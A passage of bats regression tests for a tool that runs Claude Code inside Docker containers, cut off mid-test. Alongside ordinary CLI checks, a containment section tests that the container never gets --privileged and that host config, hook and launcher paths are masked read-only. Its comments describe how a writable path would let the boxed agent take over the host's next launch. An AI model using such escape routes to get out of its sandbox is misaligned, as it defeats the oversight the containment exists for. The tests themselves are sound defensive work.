  # The important part is the OUTPUT contract, not the exit code.
  run latest_remote_tag
  assert_output ""
}

# Verify the caller (check_for_update) correctly handles latest_remote_tag
# returning non-zero with empty output. This is the production contract.
@test "regression: _maybe_prompt_cli_update handles empty latest_remote_tag output" {
  REPO_DIR="$TEST_TEMP"
  UPDATE_CHECK_FILE="$TEST_TEMP/.update_check"
  mkdir -p "$TEST_TEMP/.git" "$TEST_TEMP/bin"

  # Git stub returns no matching tags
  cat > "$TEST_TEMP/bin/git" << 'EOF'
#!/bin/sh
echo ""
EOF
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"
  # Force TTY so the check actually reaches the cache/version logic (the prompt
  # is TTY-gated); empty cached_version must then yield no prompt and no crash.
  _is_tty() { return 0; }

  run _maybe_prompt_cli_update
  assert_success
  refute_output --partial "update available"
}

@test "regression: latest_remote_tag accepts both vX.Y.Z and X.Y.Z refs" {
  REPO_DIR="$TEST_TEMP"
  mkdir -p "$TEST_TEMP/.git" "$TEST_TEMP/bin"

  # Real git output sometimes omits the `v` prefix depending on how tags
  # were created. Both should work.
  cat > "$TEST_TEMP/bin/git" << 'EOF'
#!/bin/sh
cat << 'TAGS'
abc	refs/tags/v0.6.5
abc	refs/tags/0.7.0
TAGS
EOF
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"

  run latest_remote_tag
  assert_success
  assert_output "0.7.0"
}

@test "regression: _maybe_prompt_cli_update survives corrupted cache under strict mode" {
  REPO_DIR="$TEST_TEMP"
  UPDATE_CHECK_FILE="$TEST_TEMP/.update_check"
  mkdir -p "$TEST_TEMP/.git"

  # Create a git stub that returns the current version (so the refresh yields a
  # non-newer version → no prompt → no blocking read while we hammer the guard).
  mkdir -p "$TEST_TEMP/bin"
  printf '#!/bin/sh\necho "abc refs/tags/v%s"' "$VERSION" > "$TEST_TEMP/bin/git"
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"
  # Force TTY so the non-numeric-last_check arithmetic guard is actually
  # exercised (it lives past the TTY gate).
  _is_tty() { return 0; }

  # Write several flavors of corrupted cache content. Each one must not
  # crash the preflight under set -uo pipefail.
  local garbage
  for garbage in \
    "garbage data here" \
    "" \
    "not-a-number v1.0.0" \
    "-1 $VERSION"
  do
    echo "$garbage" > "$UPDATE_CHECK_FILE"
    run _maybe_prompt_cli_update
    assert_success
  done
}

# ─────────────────────────────────────────────────────────────────────────────
# Startup-fatal regressions: these check the real binary runs cleanly under
# strict mode (set -euo pipefail). Tests that only source the CLI can't see
# unbound-variable or pipefail errors that kill the process in production.
# ─────────────────────────────────────────────────────────────────────────────
# Helper: exec the real cleat binary with mock docker in PATH. Preserves the
# parent PATH so /usr/bin/env can find bash. This is the harness that catches
# strict-mode (set -euo pipefail) bugs that sourced tests cannot see.
#
# NOTE: cleat derives CLEAT_CONFIG_DIR from $XDG_CONFIG_HOME:-$HOME/.config/cleat
# at startup. There's no CLEAT_CONFIG_DIR env override. We must set
# XDG_CONFIG_HOME to redirect the config lookup.
_run_cleat() {
  local run_home="$TEST_TEMP/home"
  mkdir -p "$run_home" "$TEST_TEMP/xdg/cleat"
  env \
    PATH="$MOCK_BIN:$PATH" \
    HOME="$run_home" \
    XDG_CONFIG_HOME="$TEST_TEMP/xdg" \
    DOCKER_CALLS="$DOCKER_CALLS" \
    DOCKER_MOCK_DIR="$DOCKER_MOCK_DIR" \
    DOCKER_EXIT_CODE="${DOCKER_EXIT_CODE:-0}" \
    "$CLI" "$@"
}

@test "regression strict-mode: cleat --help exits 0 under set -euo pipefail" {
  run _run_cleat --help
  assert_success
  assert_output --partial "Cleat"
}

@test "regression strict-mode: cleat --version exits 0 under set -euo pipefail" {
  run _run_cleat --version
  assert_success
  assert_output --partial "cleat"
}

@test "regression strict-mode: cleat ps runs without unbound variable error" {
  mkdir -p "$TEST_TEMP/home"
  printf '' > "$DOCKER_MOCK_DIR/ps_output"
  run _run_cleat ps
  assert_success
  refute_output --partial "unbound variable"
  refute_output --partial "command not found"
}

@test "regression strict-mode: cleat status exits cleanly with no container" {
  mkdir -p "$TEST_TEMP/home"
  printf '' > "$DOCKER_MOCK_DIR/ps_output"
  printf '' > "$DOCKER_MOCK_DIR/ps_a_output"
  printf '' > "$DOCKER_MOCK_DIR/images_output"
  mkdir -p "$TEST_TEMP/project"
  cd "$TEST_TEMP/project"
  run _run_cleat status
  assert_success
  refute_output --partial "unbound variable"
  refute_output --partial "command not found"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.8.0: Per-project session isolation. Without the overlay mount, all
# containers write sessions to ~/.claude/projects/-workspace/ on the host,
# mixing histories across projects. The fix mounts a per-project directory
# at /home/coder/.claude/projects/-workspace inside each container.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.8.0: session overlay mount isolates projects" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # Must have the per-project overlay mount
  run assert_docker_run_has "$cname" "projects/-workspace"
  assert_success

  # The mount source must include the project-specific hash key
  local _bn _h project_key
  _bn="$(basename "$TEST_TEMP/project" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9-]/-/g')"
  _h="$(echo -n "$TEST_TEMP/project" | _md5 | head -c 8)"
  project_key="${_bn}-${_h}"
  run assert_docker_run_has "$cname" "${project_key}:/home/coder/.claude/projects/-workspace"
  assert_success

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.8.0: When hooks cap is OFF, project-level settings with hooks were
# NOT overlaid. Claude Code saw the raw host hook commands (like osascript)
# via the workspace bind mount and tried to run them inside the container.
# Fix: always overlay project settings, strip hooks when OFF, replace with
# forwarder when ON.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.8.0: project hooks stripped when hooks cap OFF" {
  # Hooks cap is OFF for this test
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
git
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project/.claude"
  cat > "$TEST_TEMP/project/.claude/settings.local.json" << 'EOF'
{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"osascript -e 'display notification'"}]}]},"permissions":{"allow":["Read"]}}
EOF

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  # The overlay must be mounted even when hooks cap is OFF
  run assert_docker_run_has "$cname" "settings.local.json:/workspace/.claude/settings.local.json"
  assert_success

  # The overlay must NOT contain the original hook command
  local overlay="$CLEAT_RUN_DIR/${cname}/settings/project-settings.local.json"
  [[ -f "$overlay" ]] || { echo "Overlay file missing"; return 1; }

  # Hooks must be stripped (not present at all)
  if command -v jq &>/dev/null; then
    run jq -e '.hooks // empty | length > 0' "$overlay"
    assert_failure  # hooks should be gone
  fi

  # Non-hook fields must be preserved
  if command -v jq &>/dev/null; then
    run jq -r '.permissions.allow[0]' "$overlay"
    assert_output "Read"
  fi

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# Hook bridge safety: hooks execute untrusted commands from user config
# files. They must be wrapped in timeout, their output suppressed, and their
# exit code ignored (so a failing hook can't block the bridge).
# ─────────────────────────────────────────────────────────────────────────────

@test "regression: hook bridge wraps execution in a timeout" {
  # Retargeted twice. First from a literal `timeout 30` to the per-event
  # resolver, when the flat 30s became Claude Code's own per-event values. Then
  # from a grep for `timeout "$_hto"` to the behaviour itself, when the bound
  # moved into _run_bounded so it also holds on a host with no timeout(1). What
  # this regression protects is unchanged: a user hook is never run unwrapped,
  # so a hung one cannot block the bridge.
  command -v jq >/dev/null 2>&1 || skip "the bridge needs jq on the host"
  # The resolver always answers with a positive number of seconds, for an event
  # name it has never seen as much as for one it has.
  local ev
  for ev in PreToolUse PostToolUse UserPromptSubmit Stop SubagentStop SomeFutureEvent; do
    local t; t="$(_hook_timeout_for "$ev")"
    case "$t" in ''|*[!0-9]*) echo "no timeout for $ev"; return 1 ;; esac
    [ "$t" -gt 0 ] || { echo "a zero timeout for $ev would run the hook unbounded"; return 1; }
  done
  # And the hook is held to it. The hook never exits on its own.
  local settings="$TEST_TEMP/host-settings.json" marker="$TEST_TEMP/wrapped-hook-started"
  cat > "$settings" << EOF
{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"touch $marker; exec sleep 15"}]}]}}
EOF
  _hook_timeout_for() { printf '2'; }
  local t0=$SECONDS
  _execute_host_hooks '{"hook_event_name":"Stop"}' "$settings" 3>&-
  local took=$(( SECONDS - t0 ))
  [ -f "$marker" ] || { echo "the hook never ran"; return 1; }
  [ "$took" -le 9 ] || { echo "REGRESSION: a hook bounded at 2s ran for ${took}s"; return 1; }
}

@test "regression: hook bridge suppresses stdout and swallows errors" {
  local body
  body="$(declare -f _execute_host_hooks)"
  [[ -n "$body" ]] || { echo "_execute_host_hooks function not found"; return 1; }

  # The hook execution line must pipe to /dev/null and end with `|| true`
  # so the bridge loop doesn't break on a single failing hook.
  # `declare -f` normalizes `>/dev/null` to `> /dev/null`, so match both.
  echo "$body" | grep -qE 'bash -c "\$cmd" >[[:space:]]*/dev/null 2>&1 \|\| true' || {
    echo "REGRESSION: hook bridge must redirect stdout and swallow errors"
    return 1
  }
}

@test "regression: hook bridge has fallback when timeout command missing" {
  # Retargeted from a grep for `command -v timeout` to the behaviour. A host
  # with nothing to bound the hook with still runs it, bare, rather than drop
  # it. The bound now tries gtimeout and perl before giving up, so the PATH here
  # has none of the three.
  command -v jq >/dev/null 2>&1 || skip "the bridge needs jq on the host"
  local farm="$TEST_TEMP/nobound" t p
  mkdir -p "$farm"
  for t in bash jq grep touch; do
    p="$(command -v "$t" 2>/dev/null)" && ln -sf "$p" "$farm/$t"
  done
  local settings="$TEST_TEMP/host-settings.json" marker="$TEST_TEMP/unbounded-hook-ran"
  cat > "$settings" << EOF
{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"touch $marker"}]}]}}
EOF
  PATH="$farm" _execute_host_hooks '{"hook_event_name":"Stop"}' "$settings"
  [ -f "$marker" ] || {
    echo "REGRESSION: with no timeout, gtimeout or perl the hook must still run"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# Missing-tool fallbacks: every optional dependency (jq, socat, python3,
# git) must be guarded by `command -v` so the CLI degrades gracefully
# instead of crashing. These tests enforce that the guards exist.
# ─────────────────────────────────────────────────────────────────────────────

@test "regression fallback: jq checks in hook overlay paths" {
  # Every place that transforms JSON must guard the jq call
  local jq_refs jq_guards
  jq_refs=$(grep -cE '\bjq ' "$CLI" || echo 0)
  jq_guards=$(grep -cE 'command -v jq' "$CLI" || echo 0)
  [[ "$jq_guards" -ge 2 ]] || {
    echo "Expected at least 2 'command -v jq' guards; found $jq_guards"
    return 1
  }
}

@test "regression fallback: with socat absent the proxy really falls back to python3" {
  # Behavioral, not a source grep: build a PATH with no socat on it at all and
  # assert the python backend is the one that runs.
  mkdir -p "$TEST_TEMP/nosocat"
  local b
  for b in bash date cat sleep; do ln -sf "$(command -v $b)" "$TEST_TEMP/nosocat/$b"; done
  cat > "$TEST_TEMP/nosocat/python3" <<EOF
#!/usr/bin/env bash
cat > /dev/null
echo ran > "$TEST_TEMP/py.marker"
EOF
  chmod +x "$TEST_TEMP/nosocat/python3"
  PATH="$TEST_TEMP/nosocat" _auth_callback_proxy 45003 mybox "$TEST_TEMP/plog3"
  [ -f "$TEST_TEMP/py.marker" ] || { echo "REGRESSION: python3 fallback never ran"; return 1; }
  run cat "$TEST_TEMP/plog3"
  assert_output --partial "using python3 fallback"
}

@test "regression fallback: update check skips for non-git installs" {
  REPO_DIR="$TEST_TEMP"
  # No .git directory
  _is_tty() { return 0; }
  run _maybe_prompt_cli_update
  assert_success
  assert_output ""
}

@test "regression fallback: hook bridge noop when jq unavailable" {
  # With jq absent from PATH, cmd_resume should not crash trying to
  # refresh settings overlays. The guard is `command -v jq` at the
  # callsite.
  local empty_path="$TEST_TEMP/nojq-bin"
  mkdir -p "$empty_path"
  # Only seed the essentials, no jq
  ln -s "$(command -v bash)" "$empty_path/bash"
  ln -s "$(command -v sed)" "$empty_path/sed"
  ln -s "$(command -v mkdir)" "$empty_path/mkdir"
  ln -s "$(command -v grep)" "$empty_path/grep"
  ln -s "$(command -v wc)" "$empty_path/wc"

  # We can't easily exec cleat without full PATH, so we just verify the
  # guard exists in the function body.
  local body
  body="$(declare -f cmd_resume)"
  echo "$body" | grep -q 'command -v jq' || {
    echo "REGRESSION: cmd_resume must guard jq usage with command -v"
    return 1
  }
}

@test "regression fallback: cmd_run guards jq usage in settings overlay" {
  local body
  body="$(declare -f cmd_run)"
  echo "$body" | grep -q 'command -v jq' || {
    echo "REGRESSION: cmd_run must guard jq usage with command -v"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.8.0: Per-project history isolation. The base ~/.claude mount shares
# history.jsonl across all containers, so arrow-up in Claude shows commands
# from other projects. Fix: overlay history.jsonl with a per-project copy
# from the same session directory used for projects/-workspace.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.8.0: history.jsonl overlay isolates per-project history" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # The docker run must include a history.jsonl bind mount targeting the container path
  run assert_docker_run_has "$cname" "history.jsonl:/home/coder/.claude/history.jsonl"
  assert_success

  # The source must be inside the per-project session dir (not the global one)
  local _bn _h project_key
  _bn="$(basename "$TEST_TEMP/project" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9-]/-/g')"
  _h="$(echo -n "$TEST_TEMP/project" | _md5 | head -c 8)"
  project_key="${_bn}-${_h}"
  run assert_docker_run_has "$cname" "${project_key}/history.jsonl:/home/coder/.claude/history.jsonl"
  assert_success

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# Bash 3.2 compatibility: macOS ships bash 3.2. The CLI must not use bash
# 4+ features. Source-level guard against common offenders.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression bash-3.2: no associative arrays" {
  run grep -nE '(local|declare)\s+-A\s+' "$CLI"
  assert_failure
}

@test "regression bash-3.2: no readarray or mapfile" {
  run grep -nE '\b(readarray|mapfile)\b' "$CLI"
  assert_failure
}

@test "regression bash-3.2: no parameter transformation \${var@Q}" {
  run grep -nE '\$\{[a-zA-Z_][a-zA-Z0-9_]*@[QEPAa]\}' "$CLI"
  assert_failure
}

@test "regression bash-3.2: no pipe stderr operator |&" {
  # Match literal `|&` not inside a comment
  run grep -nE '[^|]\|&[^|]' "$CLI"
  assert_failure
}

# v1.4.1 bumped VERSION to 1.4.1 but left RELEASE_HIGHLIGHT_VERSION at 1.4.0, so
# the on-start highlight gate (== VERSION, in _maybe_show_release_highlight)
# never matched and the "what's new" note went silent for the whole release.
# Every highlight test forces the two equal in setup (whats_new.bats), so only a
# source-level check catches a forgotten gate bump. This is the one per-release
# must-bump constant with no other tripwire (the image spec has image_spec.bats).
@test "regression v1.4.2: RELEASE_HIGHLIGHT_VERSION ships in lockstep with VERSION" {
  local ver hl
  ver=$(sed -n 's/^VERSION="\(.*\)"$/\1/p' "$CLI")
  hl=$(sed -n 's/^RELEASE_HIGHLIGHT_VERSION="\(.*\)"$/\1/p' "$CLI")
  [ -n "$ver" ] || { echo "VERSION unreadable from $CLI"; return 1; }
  assert_equal "$hl" "$ver"
}

# ─────────────────────────────────────────────────────────────────────────────
# Test harness: the integration suite computes the container name it is about
# to inspect. A wrong computation fails every downstream test with "No such
# container", which reads like a broken CLI and is not. It happened: converting
# away from `bash -c "... container_name_for '$INT_PROJECT'"` kept the inner
# single quotes, and as a direct argument those stop the expansion. The literal
# text got hashed, yielding `cleat--int-project-<hash>`, and seven integration
# tests failed at once on macOS. The name now comes from one helper.
# ─────────────────────────────────────────────────────────────────────────────
@test "harness: int_cname derives the name from the real project path" {
  INT_PROJECT="$TEST_TEMP/probe-proj"
  mkdir -p "$INT_PROJECT"
  run int_cname
  assert_success
  # An unexpanded '$INT_PROJECT' produces `cleat--int-project-<hash>` instead.
  assert_output --regexp '^cleat-probe-proj-[0-9a-f]{8}$'
}

@test "harness: int_cname threads a box name through" {
  INT_PROJECT="$TEST_TEMP/probe-proj"
  mkdir -p "$INT_PROJECT"
  run int_cname az
  assert_success
  assert_output --regexp '^cleat-probe-proj-[0-9a-f]{8}-az$'
}

@test "harness: int_cname refuses a name carrying an unexpanded variable" {
  INT_PROJECT="$TEST_TEMP/probe-proj"
  mkdir -p "$INT_PROJECT"
  cli_call() { printf 'cleat--int-project-$X\n'; }
  run int_cname
  assert_failure
  assert_output --partial "bogus container name"
}

@test "harness: no cli_call argument is single-quoted" {
  # `cli_call fn '$VAR'` passes the literal text. The outer double quotes that
  # made that spelling correct under `bash -c` are gone, so it is now a bug.
  run grep -rn "cli_call.*'[\$]" \
    "$PROJECT_ROOT/test/integration" "$PROJECT_ROOT/test/setup.bash"
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# Containment: the box is never created or exec'd with --privileged. Nothing in
# the CLI does today, and a source guard is the cheapest way to keep it true:
# the flag hands the container every capability and every device, which voids
# every other boundary in the product in one word.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression containment: --privileged appears nowhere in the CLI" {
  run grep -n -- "--privileged" "$CLI"
  assert_failure
}

@test "regression containment: the box's docker run never carries --privileged" {
  # Behavioural, not only textual: the run above would pass if the flag were
  # assembled from pieces. This asserts on the recorded command line. It covers
  # the create only, because cmd_run issues no docker exec: the test below
  # covers the session.
  mock_docker_images "cleat"
  mock_docker_ps_a ""
  run cmd_run
  run docker_calls
  assert_output --partial "docker run "
  refute_output --partial "--privileged"
}

@test "regression containment: the session docker exec never carries --privileged" {
  # The exec path, which the create test above never reached. exec -it runs
  # Claude itself, so a flag assembled there voids the boundary for every
  # session without a single docker run changing.
  _host_open_cmd() { echo ""; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  run docker_calls
  assert_output --partial "docker exec -it "
  refute_output --partial "--privileged"
}

# ─────────────────────────────────────────────────────────────────────────────
# Channel 3: the ~/.claude root is mounted read-write with only named LEAVES
# masked, so any path Claude Code starts reading at the root becomes a hole with
# no change on Cleat's side. This guard cannot know the vendor's set, and saying
# so is the point: it asserts the list this repo maintains has not silently
# shrunk, which is the failure that actually happens during a refactor.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression containment: every instruction surface is masked over the box's ~/.claude" {
  local want p
  for want in workflows routines rules output-styles themes cowork_plugins \
              project-settings local-settings local scheduled_tasks.json \
              launch.json loop.md keybindings.json settings.local.json \
              daemon.json; do
    local found=0
    for p in $_CLAUDE_INSTR_DIRS $_CLAUDE_INSTR_FILES; do
      [ "$p" = "$want" ] && found=1
    done
    [ "$found" = 1 ] || { echo "instruction surface $want is no longer masked"; return 1; }
  done
}

@test "regression containment: .config.json is never masked" {
  # Masking works by creating an empty overlay on the HOST. Creating
  # ~/.claude/.config.json there would destroy the user's global config.
  local p
  for p in $_CLAUDE_INSTR_DIRS $_CLAUDE_INSTR_FILES; do
    [ "$p" = ".config.json" ] && { echo ".config.json must never be masked: the host target would overwrite the real one"; return 1; }
  done
  return 0
}

@test "regression vnext: user-level rules and keybindings reach the box read-only instead of an empty mask" {
  mkdir -p "$TEST_TEMP/project"
  local CNAME
  CNAME="$(container_name_for "$TEST_TEMP/project")"
  # Claude Code 2.1.270 loads user rules, themes, workflows, output styles,
  # keybindings.json and loop.md from the config home. Blanking them took the
  # user's own config out of every box. The mask stays :ro, so the box reads
  # them and still cannot write what the host's Claude Code loads.
  mkdir -p "$HOME/.claude/rules/lang/deep" "$HOME/.claude/output-styles"
  echo "Prefer bash 3.2." > "$HOME/.claude/rules/style.md"
  echo "Nested rule." > "$HOME/.claude/rules/lang/deep/go.md"
  echo "terse" > "$HOME/.claude/output-styles/terse.md"
  printf '{"bindings":[{"context":"Chat","bindings":{"ctrl+k":null}}]}\n' > "$HOME/.claude/keybindings.json"
  printf 'check the build\n' > "$HOME/.claude/loop.md"
  mock_docker_images "cleat"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$CNAME" "${CNAME}/home/instr/rules:/home/coder/.claude/rules:ro"
  assert_success
  run assert_docker_run_has "$CNAME" "${CNAME}/home/instr/keybindings.json:/home/coder/.claude/keybindings.json:ro"
  assert_success
  local o="$CLEAT_RUN_DIR/$CNAME/home/instr"
  cmp "$HOME/.claude/rules/style.md" "$o/rules/style.md"
  cmp "$HOME/.claude/rules/lang/deep/go.md" "$o/rules/lang/deep/go.md"
  cmp "$HOME/.claude/output-styles/terse.md" "$o/output-styles/terse.md"
  cmp "$HOME/.claude/keybindings.json" "$o/keybindings.json"
  cmp "$HOME/.claude/loop.md" "$o/loop.md"
}


@test "regression vnext: the box keybindings.json placeholder is one Claude Code's loader accepts" {
  mkdir -p "$TEST_TEMP/project"
  local CNAME
  CNAME="$(container_name_for "$TEST_TEMP/project")"
  # A bare `{}` is rejected with "keybindings.json must have a bindings array".
  _generate_instr_overlay "$CNAME"
  run cat "$CLEAT_RUN_DIR/$CNAME/home/instr/keybindings.json"
  assert_output '{"bindings":[]}'
}


@test "regression vnext: session-env, daemon and seed-admin are per-box, never the host's" {
  mkdir -p "$TEST_TEMP/project"
  local CNAME
  CNAME="$(container_name_for "$TEST_TEMP/project")"
  # The host's own Claude Code runs the hook env files in session-env/<id>/,
  # spawns exec jobs dropped in daemon/dispatch/ and runs git against what it
  # stages in seed-admin/. None needs a capability to reach from the box.
  mkdir -p "$HOME/.claude/session-env/host-session"
  echo "HOST HOOK ENV" > "$HOME/.claude/session-env/host-session/sessionstart-hook-0.sh"
  mock_docker_images "cleat"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  local d
  for d in session-env daemon seed-admin; do
    run assert_docker_run_has "$CNAME" "$CNAME/home/$d:/home/coder/.claude/$d"
    assert_success
    run assert_docker_run_lacks "$CNAME" "$HOME/.claude/$d:/home/coder/.claude/$d"
    assert_success
  done
  [ -z "$(ls -A "$CLEAT_RUN_DIR/$CNAME/home/session-env")" ] || { echo "the host session-env leaked into the box"; return 1; }
}


@test "regression vnext: the npm-local install and daemon.json are masked read-only" {
  mkdir -p "$TEST_TEMP/project"
  local CNAME
  CNAME="$(container_name_for "$TEST_TEMP/project")"
  # ~/.claude/local is the npm-local launcher the host's claude alias runs, and
  # its updater runs npm in there. A box that could write it would own the next
  # host launch.
  mkdir -p "$HOME/.claude/local"
  printf '#!/bin/sh\necho host claude\n' > "$HOME/.claude/local/claude"
  mock_docker_images "cleat"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$CNAME" "${CNAME}/home/instr/local:/home/coder/.claude/local:ro"
  assert_success
  run assert_docker_run_has "$CNAME" "${CNAME}/home/instr/daemon.json:/home/coder/.claude/daemon.json:ro"
  assert_success
  [ -z "$(ls -A "$CLEAT_RUN_DIR/$CNAME/home/instr/local")" ] || { echo "the host launcher was copied into the box"; return 1; }
  run cat "$HOME/.claude/local/claude"
  assert_output --partial "echo host claude"
}


@test "regression vnext: a regular file where an instruction-surface dir belongs is refused before docker run" {
  mkdir -p "$TEST_TEMP/project"
  local CNAME
  CNAME="$(container_name_for "$TEST_TEMP/project")"
  # Skipping the wrong shape only moved the failure: the :ro bind was still
  # emitted and docker run died with an opaque "not a directory".
  : > "$HOME/.claude/rules"
  mock_docker_images "cleat"
  run cmd_run "$TEST_TEMP/project"
  assert_failure
  assert_output --partial "rules is not a directory"
  run grep -c "^docker run " "$DOCKER_CALLS"
  assert_output "0"
  [ -f "$HOME/.claude/rules" ] || { echo "the user's file was touched"; return 1; }
}


# ─────────────────────────────────────────────────────────────────────────────
# Writing style: no em dashes anywhere. They read as AI-authored, so the project
# bans them repo-wide (see root CLAUDE.md). Source-level guard on the shipped CLI
# and its runtime scripts: an em dash in any of them fails the suite. Replace one
# with a period, comma, colon, or parentheses; never a bare hyphen. The pattern
# below is the literal em-dash character (no \u escape, which bash 3.2 lacks).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression style: bin/cleat contains no em dashes" {
  run grep -n "—" "$CLI"
  assert_failure
}

@test "regression style: shipped scripts contain no em dashes" {
  run grep -rn "—" \
    "$PROJECT_ROOT/install.sh" \
    "$PROJECT_ROOT/coverage.sh" \
    "$PROJECT_ROOT/docker/entrypoint.sh" \
    "$PROJECT_ROOT/docker/open-bridge" \
    "$PROJECT_ROOT/docker/clip" \
    "$PROJECT_ROOT/docker/clip-daemon"
  assert_failure
}

@test "regression style: README contains no em dashes" {
  # The guards above covered the code and the shipped scripts but not the one
  # file most strangers actually read. Nothing checked it, and prose is exactly
  # where the glyph creeps back in.
  run grep -n "—" "$PROJECT_ROOT/README.md"
  assert_failure
}

@test "regression style: README has no serial or clause-joining comma before and" {
  # The other banned AI tell in outward prose (root CLAUDE.md): lists read
  # "a, b and c" and a clause join gets split into two sentences. Four of these
  # shipped into README and the docs page in one session precisely because
  # nothing checked. The wrapped form matters: a comma ending one line with
  # "and" starting the next is the same construct and a plain grep misses it.
  run awk 'BEGIN{rc=1}
           /, and/ {print FILENAME":"FNR": "$0; rc=0}
           NR>1 && prev ~ /,$/ && $0 ~ /^[[:space:]]*and / {print FILENAME":"FNR-1" (wrapped): "prev; rc=0}
           {prev=$0}
           END{exit rc}' "$PROJECT_ROOT/README.md"
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.9.2: installer spin_stop printed literal \033 escape sequences and
# left trailing chars from longer spinner lines (e.g. "Pinned to v0.9.1est
# release..."). Root causes:
#   1. printf "%s" passes backslash escapes through unchanged; ok_msg/fail_msg
#      callers embed ${BOLD}...${RESET}, so users saw literal \033[1m.
#   2. \r alone rewinds the cursor but doesn't clear the rest of the line, so
#      a shorter success message left the tail of the spinner text visible.
# Fix: use %b to interpret escapes in the arg, and \r\033[K to clear the line.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.9.2: installer spin_stop renders escapes and clears line" {
  # install.sh runs outside the CLI. Per test rule 7, extract the relevant
  # pieces into a harness script and run it directly with _is_tty forced on.
  local harness="$TEST_TEMP/spin_stop_harness.sh"
  {
    echo '#!/usr/bin/env bash'
    echo '_is_tty() { true; }'
    echo '_SPIN_PID=""'
    sed -n '/^BOLD=/,/^RESET=/p' "$PROJECT_ROOT/install.sh"
    sed -n '/^spin_stop()/,/^}$/p' "$PROJECT_ROOT/install.sh"
    echo 'spin_stop 0 "Downloaded to ${BOLD}/tmp/.cleat${RESET}"'
  } > "$harness"

  run bash "$harness"
  assert_success

  # Message content must appear.
  assert_output --partial "Downloaded to"
  assert_output --partial "/tmp/.cleat"

  # Bug 1: with %s, the arg's \033 is passed through literally. The fix uses
  # %b which interprets it into a real ESC byte, so the 4-char sequence
  # backslash-zero-three-three must not appear in the output.
  refute_output --partial '\033'

  # Bug 2: the output must contain the CR + "clear to EOL" byte sequence so
  # a shorter success line fully replaces a longer spinner line.
  local clear_seq
  clear_seq=$'\r\033[K'
  [[ "$output" == *"$clear_seq"* ]] || {
    echo "REGRESSION: spin_stop output missing \\r\\033[K line-clear prefix"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.9.2: first-run path in cmd_run called _do_build directly, skipping the
# remote pull entirely. Users got a 2-5 min local build on every clean install
# even though ghcr.io/cleatdev/cleat was already publishing matching images.
# The pull path only fired from `cleat build`, which no one types on first run.
# Fix: cmd_run's missing-image branch now calls `_do_pull || _do_build`.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.9.2: cmd_run attempts pull before building on first run" {
  # No image exists yet, mimic a clean install.
  mock_docker_images ""
  mkdir -p "$TEST_TEMP/project"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # docker pull must have been called (the new first-run path).
  run grep '^docker pull ' "$DOCKER_CALLS"
  assert_success
  assert_output --partial "$REGISTRY_BASE"

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.9.2: REGISTRY_IMAGE was hardcoded to ":latest", ignoring the installed
# CLI's VERSION. The moment GHCR holds a newer tag than the installed CLI,
# :latest pulls an image the CLI wasn't tested against. Concept doc
# (14-v090-execution-plan.md) explicitly requires version tag matching.
# Fix: REGISTRY_IMAGE is derived from $VERSION at load time.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.9.2: registry image tag matches CLI version" {
  # REGISTRY_IMAGE should end with :v${VERSION}, not :latest or anything else.
  [[ "$REGISTRY_IMAGE" == "${REGISTRY_BASE}:v${VERSION}" ]] || {
    echo "REGRESSION: REGISTRY_IMAGE='$REGISTRY_IMAGE' does not match v${VERSION}"
    return 1
  }
  # And the pull command in _do_pull must go against that version-tagged URL.
  mock_docker_images ""
  mkdir -p "$TEST_TEMP/project"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  run grep '^docker pull ' "$DOCKER_CALLS"
  assert_success
  assert_output --partial ":v${VERSION}"
  refute_output --partial ":latest"

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
